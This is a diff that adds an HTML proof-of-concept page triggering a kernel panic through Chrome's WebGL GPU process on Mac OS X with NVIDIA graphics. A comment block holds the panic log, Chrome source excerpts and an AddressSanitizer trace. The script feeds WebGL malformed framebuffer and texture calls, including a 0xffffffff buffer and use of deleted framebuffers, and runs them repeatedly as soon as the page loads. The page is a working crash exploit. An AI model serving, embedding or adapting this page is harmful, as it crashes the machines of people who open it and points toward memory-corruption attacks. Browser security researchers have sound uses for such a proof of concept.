@@ -1,0 +1,242 @@
+<html><head><script type="text/javascript">
+/*
+ Google Chrome / NVIDIA Kernel Panic [@ gpu::gles2::GLES2DecoderImpl::ResizeOffscreenFrameBuffer]
+
+ Version Information
+ -------------------
+ Chrome version		    24.0.1278.0 (Developer Build 158615)
+ Operating system	    Mac OS X 10.8.2
+ Software rendering	    version 3.2
+ ANGLE revision		    1275
+
+ Driver Information
+ ------------------
+ Sandboxed              false
+ GPU0                   VENDOR = 0x10de, DEVICE= 0x0fd5
+ GPU1                   VENDOR = 0x8086, DEVICE= 0x0166
+ Optimus                true
+ AMD switchable         false
+ Driver version         8.0.61
+ Pixel shader version   1.20
+ Vertex shader version  1.20
+ GL version             2.1
+ GL_VENDOR              NVIDIA Corporation
+ GL_RENDERER            NVIDIA GeForce GT 650M OpenGL Engine
+ GL_VERSION             2.1 NVIDIA-8.0.61
+
+ ---------------------------------------------------------------------------------------------------
+
+ Interval Since Last Panic Report:  572973 sec
+ Panics Since Last Report:          32
+ Anonymous UUID:
+
+ Sat Sep 29 05:11:27 2012
+ panic(cpu 4 caller 0xffffff8029eb7bd5): Kernel trap at 0xffffff7fab5c6f68, type 14=page fault, registers:
+ CR0: 0x0000000080010033, CR2: 0x0000000000000020, CR3: 0x00000001390a8074, CR4: 0x00000000001606e0
+ RAX: 0x0000000000000000, RBX: 0xffffff806c09f400, RCX: 0x0000000000000001, RDX: 0xffffff804f26dce8
+ RSP: 0xffffff82415b3630, RBP: 0xffffff82415b3760, RSI: 0x00ffffff806c09f4, RDI: 0xffffff806b0daa80
+ R8:  0x0000000000000000, R9:  0x0000000000000000, R10: 0x0000000000000001, R11: 0xffffff82415b3eb8
+ R12: 0xffffff806b0daa80, R13: 0xffffff81cbb98000, R14: 0xffffff806becd858, R15: 0xffffff806c09f400
+ RFL: 0x0000000000010282, RIP: 0xffffff7fab5c6f68, CS:  0x0000000000000008, SS:  0x0000000000000010
+ Fault CR2: 0x0000000000000020, Error code: 0x0000000000000000, Fault CPU: 0x4
+
+ Backtrace (CPU 4), Frame : Return Address
+ 0xffffff82415b32d0 : 0xffffff8029e1d626
+ 0xffffff82415b3340 : 0xffffff8029eb7bd5
+ 0xffffff82415b3510 : 0xffffff8029ece4ed
+ 0xffffff82415b3530 : 0xffffff7fab5c6f68
+ 0xffffff82415b3760 : 0xffffff7fab5bf2e2
+ 0xffffff82415b37b0 : 0xffffff7fab5bf98c
+ 0xffffff82415b3850 : 0xffffff7fab5c0239
+ 0xffffff82415b3890 : 0xffffff7fab57be81
+ 0xffffff82415b3a10 : 0xffffff7fab5bc7fe
+ 0xffffff82415b3ad0 : 0xffffff7fab57a98a
+ 0xffffff82415b3b30 : 0xffffff802a265bc9
+ 0xffffff82415b3b50 : 0xffffff802a267170
+ 0xffffff82415b3bb0 : 0xffffff802a264b8f
+ 0xffffff82415b3d00 : 0xffffff8029e981e1
+ 0xffffff82415b3e10 : 0xffffff8029e20aed
+ 0xffffff82415b3e40 : 0xffffff8029e10448
+ 0xffffff82415b3e90 : 0xffffff8029e1961b
+ 0xffffff82415b3f00 : 0xffffff8029ea59be
+ 0xffffff82415b3fb0 : 0xffffff8029eceafe
+
+ ---------------------------------------------------------------------------------------------------
+
+ [483:-1401730520:0929/021123:ERROR:gles2_cmd_decoder.cc(3167)] GLES2DecoderImpl::ResizeOffscreenFrameBuffer failed because offscreen FBO was incomplete.
+ [483:-1401730520:0929/021123:ERROR:gles2_cmd_decoder.cc(3212)] GLES2DecoderImpl: Context lost because ResizeOffscreenFrameBuffer failed.
+ [483:-1401730520:0929/021123:ERROR:gpu_scheduler.cc(94)] [0xfbc72480] GPU PARSE ERROR: 5
+
+ ---------------------------------------------------------------------------------------------------
+
+ ./gpu/command_buffer/service/gles2_cmd_decoder.cc:3212
+
+ error::Error GLES2DecoderImpl::HandleResizeCHROMIUM(
+ uint32 immediate_data_size, const gles2::ResizeCHROMIUM& c) {
+ GLuint width = static_cast<GLuint>(c.width);
+ GLuint height = static_cast<GLuint>(c.height);
+ TRACE_EVENT2("gpu", "glResizeChromium", "width", width, "height", height);
+ #if defined(OS_POSIX) && !defined(OS_MACOSX) && \
+ !defined(UI_COMPOSITOR_IMAGE_TRANSPORT)
+ // Make sure that we are done drawing to the back buffer before resizing.
+ glFinish();
+ #endif
+ bool is_offscreen = !!offscreen_target_frame_buffer_.get();
+ if (is_offscreen) {
+ if (!ResizeOffscreenFrameBuffer(gfx::Size(width, height))) { // <-- Called
+ LOG(ERROR) << "GLES2DecoderImpl: Context lost because "
+ << "ResizeOffscreenFrameBuffer failed.";
+ return error::kLostContext;
+ }
+ }
+ […]
+
+
+ ./gpu/command_buffer/service/gles2_cmd_decoder.cc:3167
+
+ bool GLES2DecoderImpl::ResizeOffscreenFrameBuffer(const gfx::Size& size) {
+ […]
+ if (offscreen_target_frame_buffer_->CheckStatus() !=
+ GL_FRAMEBUFFER_COMPLETE) {
+ LOG(ERROR) << "GLES2DecoderImpl::ResizeOffscreenFrameBuffer failed "
+ << "because offscreen FBO was incomplete.";
+ return false;
+ }
+ […]
+
+
+ ./gpu/command_buffer/service/gpu_scheduler.cc:94
+
+ void GpuScheduler::PutChanged() {
+ […]
+ // TODO(piman): various classes duplicate various pieces of state, leading
+ // to needlessly complex update logic. It should be possible to simply
+ // share the state across all of them.
+ command_buffer_->SetGetOffset(static_cast<int32>(parser_->get()));
+
+ if (error::IsError(error)) {
+ LOG(ERROR) << "[" << decoder_ << "] "
+ << "GPU PARSE ERROR: " << error;
+ command_buffer_->SetContextLostReason(decoder_->GetContextLostReason());
+ command_buffer_->SetParseError(error);
+ return;
+ }
+ […]
+
+
+
+ ==412== ERROR: AddressSanitizer crashed on unknown address 0x000ef8f1 (pc 0x8ee2d6da sp 0xbff15c20 bp 0xbff15c38 T0)
+ AddressSanitizer can not provide additional info.
+ #0 0x8ee2d6d9 in 0x2000e36d9
+ #1 0x8f083877 in 0x200339877
+ #2 0x8f11cfed in 0x2003d2fed
+ #3 0x8ed8a804 in 0x200040804
+ #4 0x8eddb1d8 in 0x2000911d8
+ #5 0x8ede9eeb in 0x20009feeb
+ #6 0x8ed7fe5b in 0x200035e5b
+ #7 0x8ee95b1c in 0x20014bb1c
+ #8 0x8f32ff05 in 0x2005e5f05
+ #9 0x8ee95d3e in 0x20014bd3e
+ #10 0x8ee96146 in 0x20014c146
+ #11 0x8ee96231 in 0x20014c231
+ #12 0x8ed848c0 in 0x20003a8c0
+ #13 0x8ed85b39 in 0x20003bb39
+ #14 0x8ee01a67 in 0x2000b7a67
+ #15 0x1274c55c in gleDoSelectiveDispatchCore (in GLEngine) + 565
+ #16 0x1263f9b3 in glClear_Exec (in GLEngine) + 421
+ #17 0x94647e17 in glClear (in libGL.dylib) + 27
+ #18 0x43a5713 in gpu::gles2::GLES2DecoderImpl::ResizeOffscreenFrameBuffer(gfx::Size const&) (in Chromium Framework) + 2435
+ #19 0x439ee48 in gpu::gles2::GLES2DecoderImpl::Initialize(scoped_refptr<gfx::GLSurface> const&, scoped_refptr<gfx::GLContext> const&, bool, gfx::Size const&, gpu::gles2::DisallowedFeatures const&, char const*, std::vector<int, std::allocator<int> > const&) (in Chromium Framework) + 6456
+ #20 0x777d102 in GpuCommandBufferStub::OnInitialize(IPC::Message*) (in Chromium Framework) + 2130
+ #21 0x7790d4c in void DispatchToMethod<GpuCommandBufferStub, void (GpuCommandBufferStub::*)(IPC::Message*), IPC::Message&>(GpuCommandBufferStub*, void (GpuCommandBufferStub::*)(IPC::Message*), Tuple0 const&, Tuple1<IPC::Message&>*) (in Chromium Framework) + 140
+ #22 0x7791312 in bool IPC::SyncMessageSchema<Tuple0, Tuple1<bool&> >::DispatchDelayReplyWithSendParams<GpuCommandBufferStub, void (GpuCommandBufferStub::*)(IPC::Message*)>(bool, Tuple0 const&, IPC::Message const*, GpuCommandBufferStub*, void (GpuCommandBufferStub::*)(IPC::Message*)) (in Chromium Framework) + 306
+ #23 0x77838d4 in bool GpuCommandBufferMsg_Initialize::DispatchDelayReply<GpuCommandBufferStub, void (GpuCommandBufferStub::*)(IPC::Message*)>(IPC::Message const*, GpuCommandBufferStub*, void (GpuCommandBufferStub::*)(IPC::Message*)) (in Chromium Framework) + 260
+ #24 0x777b261 in GpuCommandBufferStub::OnMessageReceived(IPC::Message const&) (in Chromium Framework) + 1761
+ #25 0x778111a in non-virtual thunk to GpuCommandBufferStub::OnMessageReceived(IPC::Message const&) (in Chromium Framework) + 26
+ #26 0x7804bc8 in MessageRouter::RouteMessage(IPC::Message const&) (in Chromium Framework) + 104
+ #27 0x776640d in GpuChannel::HandleMessage() (in Chromium Framework) + 429
+ #28 0x776c095 in base::internal::RunnableAdapter<void (GpuChannel::*)()>::Run(GpuChannel*) (in Chromium Framework) + 101
+ #29 0x776d635 in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (GpuChannel::*)()>, void (base::WeakPtr<GpuChannel> const&)>::MakeItSo(base::internal::RunnableAdapter<void (GpuChannel::*)()>, base::WeakPtr<GpuChannel> const&) (in Chromium Framework) + 53
+ #30 0x776d59c in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (GpuChannel::*)()>, void (GpuChannel*), void (base::WeakPtr<GpuChannel>)>, void ()(GpuChannel*)>::Run(base::internal::BindStateBase*) (in Chromium Framework) + 188
+ #31 0x4299f58 in base::Callback<void ()>::Run() const (in Chromium Framework) + 56
+ #32 0x4297299 in MessageLoop::RunTask(base::PendingTask const&) (in Chromium Framework) + 1481
+ #33 0x4297a0f in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) (in Chromium Framework) + 127
+ #34 0x4297b87 in MessageLoop::DoWork() (in Chromium Framework) + 279
+ #35 0x4209499 in base::MessagePumpLibevent::Run(base::MessagePump::Delegate*) (in Chromium Framework) + 1881
+ #36 0x4296815 in MessageLoop::RunInternal() (in Chromium Framework) + 437
+ #37 0x42e6ea8 in base::RunLoop::Run() (in Chromium Framework) + 56
+ #38 0x4295871 in MessageLoop::Run() (in Chromium Framework) + 113
+ #39 0x39c6cab in GpuMain(content::MainFunctionParams const&) (in Chromium Framework) + 3275
+ #40 0x7b3e236 in content::RunNamedProcessTypeMain(std::string const&, content::MainFunctionParams const&, content::ContentMainDelegate*) (in Chromium Framework) + 326
+ #41 0x7b3f853 in content::ContentMainRunnerImpl::Run() (in Chromium Framework) + 707
+ #42 0x7b3d839 in content::ContentMain(int, char const**, content::ContentMainDelegate*) (in Chromium Framework) + 313
+ #43 0x1129493 in ChromeMain (in Chromium Framework) + 131
+ #44 0xe5ed8 in main (in Chromium Helper) + 24
+ #45 0xe5eb4 in start (in Chromium Helper) + 52
+ #46 0x9
+ Stats: 1275M malloced (1501M for red zones) by 2179066 calls
+ Stats: 0M realloced by 300 calls
+ Stats: 980M freed by 1769664 calls
+ Stats: 871M really freed by 1552818 calls
+ Stats: 784M (200848 full pages) mmaped in 196 calls
+ mmaps   by size class: 8:557022; 9:24573; 10:16380; 11:22517; 12:10240; 13:5632; 14:5632; 15:1024; 16:256; 17:704; 18:512; 19:96; 20:92;
+ mallocs by size class: 8:2033099; 9:32899; 10:37752; 11:24962; 12:12540; 13:5978; 14:22654; 15:4583; 16:260; 17:2295; 18:503; 19:771; 20:771;
+ frees   by size class: 8:1692385; 9:15684; 10:25859; 11:4734; 12:3233; 13:929; 14:19404; 15:4083; 16:11; 17:1795; 18:5; 19:771; 20:771;
+ rfrees  by size class: 8:1483946; 9:13933; 10:22912; 11:4356; 12:3057; 13:841; 14:17168; 15:3619; 16:11; 17:1596; 18:5; 19:687; 20:687;
+ Stats: malloc large: 4372 small slow: 9680
+*/
+function crash() {
+    var backup = document.getElementById("canvasbox").innerHTML;
+    var o = webgl("canvas", "void main() {}", "void main() {}");
+    var gl = o.gl;
+    var pg = o.pg;
+
+    try {
+        var aca = gl.createFramebuffer();
+        gl.bindFramebuffer(36160, aca);
+        gl.pixelStorei(37440, 536);
+    } catch(e){};
+    //try { gl.checkFramebufferStatus(36160); } catch(e) {};
+    try { gl.bindFramebuffer(36160, aca); } catch(e) {};
+    try { var bcc = gl.createTexture();
+        gl.bindTexture(34067, bcc);
+        var bcc = new ArrayBuffer(0xffffffff);
+        gl.texSubImage2D(34070, 0xffff, 0xffffff, 0xffffff, 0xffffff, 0, 6409, 32819, bcc);
+        gl.framebufferTexture2D(36160, 36128, 3553, bcc, 0); } catch(e){}
+    try { gl.framebufferTexture2D(36160, 36128, 34070, bcc, 0); } catch(e){}
+    try { gl.framebufferTexture2D(36160, 36128, 34070, bcc, 0); } catch(e){};
+    try { var ccb = gl.createFramebuffer(); } catch(e){};
+    try { gl.framebufferTexture2D(36160, 36096, 34069, bcc, 0); } catch(e){};
+    try { gl.deleteFramebuffer(aca); } catch(e) {};
+    try { gl.bindFramebuffer(36160, aca); } catch(e) {};
+    try { gl.deleteFramebuffer(aca); } catch(e) {};
+
+
+    document.getElementById("canvasbox").innerHTML = backup;
+    o = null;
+}
+function webgl(id, vshader, fshader) {
+    var gl = document.getElementById(id).getContext("experimental-webgl");
+    var program = gl.createProgram();
+    document.getElementById("canvas").width = 0xffff;
+    var add = function (type, source) {
+        var shader = gl.createShader(type);
+        gl.shaderSource(shader, source);
+        gl.compileShader(shader);
+        if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS))
+            alert("compile error: " + gl.getShaderInfoLog(shader));
+        gl.attachShader(program, shader);
+    };
+    add(gl.VERTEX_SHADER, vshader);
+    add(gl.FRAGMENT_SHADER, fshader);
+    gl.linkProgram(program);
+    if (!gl.getProgramParameter(program, gl.LINK_STATUS))
+        alert("link error: " + gl.getProgramInfoLog(program));
+    gl.useProgram(program);
+    return {gl:gl, pg:program};
+}
+</script>
+</head><body onload="setInterval(crash, 0);">
+<span id="canvasbox"><canvas id="canvas" width="100" height="100"></canvas></span>
+</body>
+</html>
